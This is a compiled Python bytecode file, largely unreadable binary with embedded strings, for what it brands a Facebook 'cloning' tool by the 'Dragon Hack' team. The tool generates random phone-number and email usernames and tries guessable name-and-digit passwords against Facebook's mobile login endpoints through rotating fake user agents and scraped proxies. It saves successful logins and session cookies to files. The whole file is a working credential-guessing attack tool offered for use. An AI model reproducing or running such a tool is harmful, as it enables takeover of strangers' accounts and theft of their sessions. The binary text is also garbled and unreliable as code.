�
    �%d2  �                   �X  � d dl Z d dlZd dlZd dlZd dlZd dlZd dlZd dlZd dlZd dl	Z	d dl
mZ d dl
mZ d dlZd dlmZ d dlmZ d dlmZ d dl mZ d dlmZ 	 d dlZd dlmZ d dlZd dlmZ n+# e$ r#  e j        d	�  �          e j        d
�  �         Y nw xY wdZdZdZdZdZ dZ!dZ"dZ#dZ$dZ%dZ&dZ'dZ(dZ)dZ*dZ+dZ,dZ-dZ.dZ/dZ0dZ1dZ2 ej3        �   �         Z3e3�4                    d �  �        Z5 ej3        �   �         Z6e6j7        Z8e6j9        Z:e6j;        Z< ej=        �   �         Z=d a>g a?g a@g ZAg ZBg ZC ejD        �   �         ZEg ZF	  ejG        d!�  �        jH        ZI eJd"d#�  �        �K                    eI�  �         n# eL$ rZM eNd$�  �         Y dZM[MndZM[Mww xY w eJd"d%�  �        �O                    �   �         �P                    �   �         ZI eQd&�  �        D ]�ZRd'ZS ejT        g d(��  �        ZUd)ZV ejT        g d*��  �        ZW ejX        d+d,�  �        ZM ejT        g d*��  �        ZYd-ZZ ejX        d.d/�  �        Z[d0Z\ ejX        d1d2�  �        Z] ejX        d3d4�  �        Z^d5Z_eS� d6eU� d7eV� eW� eM� eY� d8eZ� e[� d9e\� d9e]� d9e^� d6e_� �Z`eB�a                    e`�  �         ��d:Zb G d;� d<�  �        Zcd=� Zdd>� Zed?� Zfd@� Zg ec�   �          dS )A�    N)�BeautifulSoup)�date)�datetime)�sleep)�system)�ThreadPoolExecutor)�ConnectionErrorz9pip install mechanize requests futures bs4==2 > /dev/nullzpip install bs4z[1;91mz[1;97mz[1;32mz[1;33mz[1;34mz[1;35mz[1;92mz[1;93mz[1;94mz[1;95mz[1;96mz[0mz[1;90mz[1;107mz[1;106mz[1;105mz[1;104mz[1;103mz[1;102mz[1;101mz[1;100mz%H:%Mzwhttps://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=allz	.prox.txt�w� �ri'  zMozilla/5.0 (Linux; U; Android)�3�4�5�6�7�8�9�10�11�12�13�14�15�16�17z en-us; GT-)�A�B�C�D�E�F�G�H�I�J�K�L�M�N�O�P�Q�R�S�T�U�V�W�X�Y�Z�   i�  z.AppleWebKit/537.36 (KHTML, like Gecko) Chrome/�I   �d   �0ih  i$  �(   �   zMobile Safari/537.36� z; z) �.ud  [1;32m
         ███╗   ██╗ ██████╗  ██████╗ ██████╗            │
         ████╗  ██║██╔═══██╗██╔═══██╗██╔══██╗           │
         ██╔██╗ ██║██║   ██║██║   ██║██████╔╝           │
         ██║╚██╗██║██║   ██║██║   ██║██╔══██╗           │
         ██║ ╚████║╚██████╔╝╚██████╔╝██║  ██║           │
         ╚═╝  ╚═══╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═╝                      
                                                                                                
╔═════════════════════════════════════════════╗
║  [+] AUTHOR   : RAYEES NOOR                 ║
║  [+] WHATSAPP : +93704231152                ║
║  [+] TEAM     : DRAGON HACK                 ║
║  [+] CREATOR  : MRx NOOR                    ║
║  [+] VERSION  : 5.0.0                       ║
╚═════════════════════════════════════════════╝c                   �   � e Zd Zd� ZdS )�Mainc                 ��  � g | _         g | _        g | _        d| _        t	          j        d�  �         t	          j        d�  �         t          t          �  �         t          d�  �         t          d�  �         t          d�  �         t          d�  �         t          d�  �        }|d	v rt          �   �          |d
v rt          �   �          |dv rt          �   �          |dv rt          �   �          d S t          �   �          d S )Nr   �clear�#xdg-open https://t.me/NOOR_TECH_538u;    [1] ꜰᴀᴄᴇʙᴏᴏᴋ ᴇᴍᴀɪʟ ᴄʟᴏɴɪɴɢuD    [2] ꜰᴀᴄᴇʙᴏᴏᴋ ᴜꜱᴇʀɴᴀᴍᴇ ᴄʟᴏɴɪɴɢuS    [3] ꜰᴀᴄᴇʙᴏᴏᴋ ʀᴀɴᴅᴏᴍ ᴄʟᴏɴɪɴɢ [[1;35mAFGHANISTAN]z	 [0] Exitu    [√] Choose : )�1�01)�2�02)r   �03)z 0�00)�id�ok�cp�loop�osr   �print�logo�input�v1�v2�v3�exit)�self�Snigdhos     �Abal-Open-Source.py�__init__zMain.__init__a   s�   � ������������	�
�	�'����
�	�7�8�8�8��d�����K�L�L�L��T�U�U�U��f�g�g�g��k�����)�*�*���k�!�!��D�D�D��k�!�!��D�D�D��j� � ��D�D�D��l�"�"��F�F�F�F�F��F�F�F�F�F�    N)�__name__�
__module__�__qualname__rX   � rY   rW   r?   r?   `   s#   � � � � � �� � � � rY   r?   c                  �p  � g } t          j        d�  �         t          j        d�  �         t          t          �  �         t	          d�  �        }t	          d�  �        }t          d�  �         t	          d�  �        }t          t	          d�  �        �  �        }t          |�  �        D ]D}d�                    d	� t          d
d�  �        D �   �         �  �        }| �                    |�  �         �Et          d��  �        5 }t          j        d�  �         t          t          �  �         t          t          | �  �        �  �        }t          d|z   �  �         t          d|� ��  �         t          d�  �         t          d�  �         t          d�  �         | D ]N}	||z   |	z   |z   }
||||z   |dz   |dz   |dz   ||	z   |dz   |dz   |dz   g
}|�                    t          |
||�  �         �O	 d d d �  �         n# 1 swxY w Y   t          d�  �         t          d�  �         t          d�  �         t          d�  �         d S )NrA   rB   �    [💉]  target fast name : �    [💉] target last name :  u0    [🤝] example Doamin : @gmail.com, @yahoo.com u    [📧]  Input Doamin  : �*[?] How many numbers do you want to add : r   c              3   �R   K  � | ]"}t          j        t          j        �  �        V � �#d S �N��random�choice�string�digits��.0�_s     rW   �	<genexpr>zv1.<locals>.<genexpr>�   �.   � � � �G�G�q�f�m�F�M�2�2�G�G�G�G�G�GrY   r6   �   �   ��max_workers�    [♥]  Total ids:[1;92m �%   [1;97m [♥]  Target Doamin:[1;92m �+    [1;97m[♥]  The process has been started�    [♥]  Wait for ids �2__________________________________________________�123�1234�12345�'    [♥] Crack process has been completed�!    [♥] Ids saved in ok.txt,cp.txt�rM   r   rN   rO   rP   �int�range�join�append�
ThreadPool�str�len�submit�rcrack1��user�kode�kodex�doamin�limit�nmbr�nmp�yaari�tl�guru�uid�pwxs               rW   rQ   rQ   x   sv  � �	�D��I�g�����I�3�4�4�4�	�$�K�K�K��/�0�0�D��0�1�1�E�	�
<�=�=�=��.�/�/�F���B�C�C�D�D�E��e��� � ���g�g�G�G�E�!�A�J�J�G�G�G�G�G�����C�����	��	#�	#�	#� -�u�
�	�'�����d������T���^�^���-�b�0�1�1�1��D�F�D�D�E�E�E��>�?�?�?��%�&�&�&��f����� 	-� 	-�D��u�*�T�/�&�(�C���d�5�j��e��D��K��W��T�RV�Y�W\�]b�Wb�ch�io�co�pu�v}�p}�~�C��L�L���S��,�,�,�,�	-�-� -� -� -� -� -� -� -� -� -� -���� -� -� -� -� 
�&�M�M�M�	�
3�4�4�4�	�
-�.�.�.�	�&�M�M�M�M�Ms   �;C'G/�/G3�6G3c                  �2  � g } t          j        d�  �         t          j        d�  �         t          t          �  �         t	          d�  �        }t	          d�  �        }d}t          t	          d�  �        �  �        }t          |�  �        D ]D}d�                    d� t          d	d
�  �        D �   �         �  �        }| �                    |�  �         �Et          d��  �        5 }t          j        d�  �         t          t          �  �         t          t          | �  �        �  �        }t          d|z   �  �         t          d�  �         t          d�  �         t          d�  �         t          d�  �         | D ]N}	||z   |z   |	z   }
||||z   |dz   |dz   |dz   ||	z   |dz   |dz   |dz   g
}|�                    t          |
||�  �         �O	 d d d �  �         n# 1 swxY w Y   t          d�  �         t          d�  �         t          d�  �         t          d�  �         d S )NrA   rB   r_   r`   r=   ra   r   c              3   �R   K  � | ]"}t          j        t          j        �  �        V � �#d S rc   rd   ri   s     rW   rl   zv2.<locals>.<genexpr>�   rm   rY   r6   rn   ro   rp   rr   u<   [1;97m [♥]  Target Doamin:[1;92m Facebook CLONING (name)rt   ru   rv   rw   rx   ry   rz   u%    [♥] Ids saved in noorok.txt,cp.txtr|   r�   s               rW   rR   rR   �   sW  � �	�D��I�g�����I�3�4�4�4�	�$�K�K�K��/�0�0�D��0�1�1�E��F���B�C�C�D�D�E��e��� � ���g�g�G�G�E�!�A�J�J�G�G�G�G�G�����C�����	��	#�	#�	#� -�u�
�	�'�����d������T���^�^���-�b�0�1�1�1��S�T�T�T��>�?�?�?��%�&�&�&��f����� 	-� 	-�D��v�+�e�#�D�(�C���d�5�j��e��D��K��W��T�RV�Y�W\�]b�Wb�ch�io�co�pu�v}�p}�~�C��L�L���S��,�,�,�,�	-�-� -� -� -� -� -� -� -� -� -� -���� -� -� -� -� 
�&�M�M�M�	�
3�4�4�4�	�
1�2�2�2�	�&�M�M�M�M�Ms   �C$G�G�Gc                  ��  � g } t          j        d�  �         t          j        d�  �         t          t          �  �         t	          d�  �        }d�                    d� t          d�  �        D �   �         �  �        }d�                    d� t          d�  �        D �   �         �  �        }d}t          t	          d	�  �        �  �        }t          |�  �        D ]C}d�                    d
� t          d�  �        D �   �         �  �        }| �                    |�  �         �Dt          d��  �        5 }t          j        d�  �         t          j        d�  �         t          t          �  �         t          t          | �  �        �  �        }	t          d|	z   �  �         t          d|� ��  �         t          d�  �         t          d�  �         t          d�  �         | D ]F}
||z   |z   |
z   }||z   |z   |
z   ||
z   ||
z   ||z   |z   dg}|�                    t          |||	�  �         �G	 d d d �  �         n# 1 swxY w Y   t          d�  �         t          d�  �         t          d�  �         t          d�  �         d S )NrA   z5xdg-open https://facebook.com/groups/951539065723248/u,    [💉] Enter sim code: Ex: 9370,9378,9379 :r   c              3   �R   K  � | ]"}t          j        t          j        �  �        V � �#d S rc   rd   ri   s     rW   rl   zv3.<locals>.<genexpr>�   s.   � � � �C�C�Q�F�M�&�-�0�0�C�C�C�C�C�CrY   �   c              3   �R   K  � | ]"}t          j        t          j        �  �        V � �#d S rc   rd   ri   s     rW   rl   zv3.<locals>.<genexpr>�   s.   � � � �A�A�1�&�-���.�.�A�A�A�A�A�ArY   z Facebook CLONING (AFG number) ra   c              3   �R   K  � | ]"}t          j        t          j        �  �        V � �#d S rc   rd   ri   s     rW   rl   zv3.<locals>.<genexpr>�   s.   � � � �E�E�q�f�m�F�M�2�2�E�E�E�E�E�ErY   rn   ro   rp   z8xdg-open fb:https://facebook.com/groups/951539065723248/rr   rs   rt   ru   rv   �
bangladeshrz   r{   )rM   r   rN   rO   rP   r   r~   r}   r�   r�   r�   r�   r�   r�   )r�   r�   r�   �kodr�   r�   r�   r�   r�   r�   r�   r�   r�   s                rW   rS   rS   �   s�  � �	�D��I�g�����I�E�F�F�F�	�$�K�K�K��?�@�@�D��G�G�C�C�%��(�(�C�C�C�C�C�E�
�'�'�A�A��a���A�A�A�
A�
A�C�.�F���B�C�C�D�D�E��e��� � ���g�g�E�E�E�!�H�H�E�E�E�E�E�����C�����	��	#�	#�	#� -�u�
�	�'����
�	�L�M�M�M��d������T���^�^���-�b�0�1�1�1��D�F�D�D�E�E�E��>�?�?�?��%�&�&�&��f����� 	-� 	-�D��u�*�S�.��%�C���:�c�>�$�&�s�4�x��d�
�4��:�c�>�,�W�C��L�L���S��,�,�,�,�	-�-� -� -� -� -� -� -� -� -� -� -���� -� -� -� -� 
�&�M�M�M�	�
3�4�4�4�	�
-�.�.�.�	�&�M�M�M�M�Ms   �'C3H'�'H+�.H+c                 �  � 	 |D �]�}t          j        t          �  �        }t          j        �   �         }t
          j        �                    dt          �d|�dt          t          �  �        �dt          t          �  �        �d�	�  �        f t
          j        �                    �   �          |�                    d�  �        j        }t          j        dt#          |�  �        �  �        �                    d�  �        t          j        d	t#          |�  �        �  �        �                    d�  �        t          j        d
t#          |�  �        �  �        �                    d�  �        t          j        dt#          |�  �        �  �        �                    d�  �        dd| |dd�	}i dd�dd�dd�dd�dd�dd�dd�dd�dd �d!d"�d#d$�d%d&�d'd(�d)d*�d+d,�d-d.�d/|�}|�                    d0||�1�  �        j        }	|j        �                    �   �         �                    �   �         }
d2|
v r�d3�                    d4� |j        �                    �   �         �                    �   �         D �   �         �  �        }|d5d6�         }t3          d7| � d8|� ��  �         t3          d9|� ��  �         t3          d:�  �         t5          d;d<�  �        �                    | d=z   |z   d>z   �  �         t          �                    | �  �          n�d?|
v r�d3�                    d@� |j        �                    �   �         �                    �   �         D �   �         �  �        }|dAdB�         }t3          dC| � d8|� ��  �         t5          dDd<�  �        �                    | d=z   |z   dEz   �  �         t          �                    | �  �          n���t          dz  at
          j        �                    dFt          t          t          �  �        fz  �  �        f t
          j        �                    �   �          d S #  Y d S xY w)GNz[[1;92mNOOR[1;97m] [�/z] [[1;92mOK[1;97m:-[1;92mz#[1;97m] [[1;91mCP[1;97m:-[1;91mz
[1;97m] zhttps://mbasic.facebook.comzname="lsd" value="(.*?)"r6   zname="jazoest" value="(.*?)"zname="m_ts" value="(.*?)"zname="li" value="(.*?)"r9   zLog In)	�lsd�jazoest�m_ts�li�
try_number�unrecognized_tries�email�pass�login�	authorityzmbasic.facebook.com�method�GET�scheme�https�pathzK/login/?li=SzDyYxLS203msIZ1guf5Hmm3&e=1348029&shbl=1&refsrc=deprecated&_rdr�acceptz�text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9zaccept-languagezen-US,en;q=0.9zcache-controlz	max-age=0�refererzfhttps://mbasic.facebook.com/login/?li=SzDyYxLS203msIZ1guf5Hmm3&e=1348029&shbl=1&refsrc=deprecated&_rdrz	sec-ch-uazB"(Not(A:Brand";v="99", "Chromium";v="110", "Google Chrome";v="110"zsec-ch-ua-mobilez?0zsec-ch-ua-platformz	"Windows"zsec-fetch-dest�documentzsec-fetch-mode�navigatezsec-fetch-sitezsame-originzsec-fetch-userz?1zupgrade-insecure-requestsrC   z
user-agentzBhttps://free.facebook.com/login/device-based/regular/login/?refsrc)�data�headers�c_user�;c                 �$   � g | ]\  }}|d z   |z   ��S ��=r]   �rj   �key�values      rW   �
<listcomp>zrcrack1.<locals>.<listcomp>�   �$   � �a�a�a���U�s�3�w�u�}�a�a�arY   �   �   u   [38;5;46m[NOOR-OK💛] �|z 
 Cookie : u�    
 ══════════════════════════════════════════z/sdcard/NOOR/ok.txt�az | �
�
checkpointc                 �$   � g | ]\  }}|d z   |z   ��S r�   r]   r�   s      rW   r�   zrcrack1.<locals>.<listcomp>  r�   rY   �R   �a   u   [38;5;196m[NOOR-CP🔒] z/sdcard/NOOR-CP.txtz 
u5   [m[NOOR💉] [1;92m%s[m |[m[[mOK:[1;92m%s[m] )re   rf   �ugen�requests�Session�sys�stdout�writerL   r�   �oks�cps�flush�get�text�re�searchr�   �group�post�cookies�get_dict�keysr   �itemsrN   �openr�   )r�   r�   r�   �ps�pro�session�free_fb�log_data�header_freefb�lo�log_cookies�coki�cids                rW   r�   r�   �   s�  � �
;�� 5	� 5	�B��-��%�%�C��&�(�(�G��J����  ko�  ko�  ko�  pr�  pr�  pr�  sv�  wz�  s{�  s{�  s{�  s{�  |�  @C�  |D�  |D�  |D�  |D�  E�  F�  F�  G�  G��J�������k�k�"?�@�@�E�G��i� :�C��L�L�I�I�O�O�PQ�R�R��i� >��G���M�M�S�S�TU�V�V��9�8�#�g�,�,�G�G�M�M�a�P�P���4�c�'�l�l�C�C�I�I�!�L�L��!$����	� 	�H��[�*?� ��e���g�� �`�� �  `�	�
 �/�� �[�� ��� �]�� ��� !�+�� �j�� �j�� �m�� �d��  (��!�" ��#�M�$ ���b�hp�  zG��  H�  H�  M�B���0�0�2�2�7�7�9�9�K��;�&�&��X�X�a�a�g�o�>V�>V�>X�>X�>^�>^�>`�>`�a�a�a�b�b���1�R�4�j���>�C�>�>�"�>�>�?�?�?��,�d�,�,�-�-�-��  \�  ]�  ]�  ]��*�C�0�0�6�6��E�	�"��T�8I�J�J�J��
�
�3��������,�,��X�X�a�a�g�o�>V�>V�>X�>X�>^�>^�>`�>`�a�a�a�b�b���2�b�5�k���?�S�?�?�2�?�?�@�@�@��*�C�0�0�6�6��E�	�"��U�8J�K�K�K��
�
�3��������a����
���g�im�nq�ru�nv�nv�hw�w�x�x�y�y��
���������������s   �PP �P
)hrM   r�   �time�jsonre   r�   rg   �platform�base64�uuid�bs4r   �sopr�   �ressr   r   r   r   �s�waktu�concurrent.futuresr   r�   �	mechanize�requests.exceptionsr	   �ModuleNotFoundError�RED�WHITE�GREEN�YELLOW�BLUE�ORANGEr+   r(   r#   r&   r   r0   r*   r)   r   �BN�BBL�BP�BB�BK�BH�BM�BA�now�strftime�	dt_string�current�year�ta�month�bu�day�ha�todayrL   r�   r�   �ugen2r�   �cokbrutr�   �ses�princpr�   r�   �proxr�   r�   �	Exception�erN   �read�
splitlinesr~   �xd�aarf   �b�c�d�	randrange�f�g�h�i�j�k�l�uaku2r�   rO   r?   rQ   rR   rS   r�   r]   rY   rW   �<module>r"     s  �� >� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� $� $� $� $� $� $� � � � � � � � � � � � � � � � � � � � � � � � � � � � � � � � � � � � � � � � �!��O�O�O�C�C�C�C�C�C�����3�3�3�3�3�3�3��� !� !� !��B�I�I�J�J�J��B�I�� � � � � �!���� ������	����	�������������������������������������h�l�n�n���L�L��!�!�	�
�(�,�.�.���\���]���[����
��������������
���H�����	����x�|�  N�  O�  O�  T����k�#�����T�"�"�"�"��� � � ���r�����������������	�T�+�c�����!�!�,�,�.�.��
�%��,�,� � �B�'�B��f�m�Y�Y�Y�Z�Z�A��A��f�m�  V�  V�  V�  W�  W�A��f��q�#���A��f�m�  V�  V�  V�  W�  W�A�6�A��f��r�#���A�	�A��f��t�D�!�!�A��f��r�#���A��A��<�<�1�<�<��<�1�<�a�<��<�<�a�<��<�<�Q�<�<��<�<�Q�<�<��<�<�E��K�K������	Q�� � � � � � � � �0� � �<� � �:� � �>@� @� @�B ������s*   �A- �-%B�B�;4E0 �0F
�5F�F
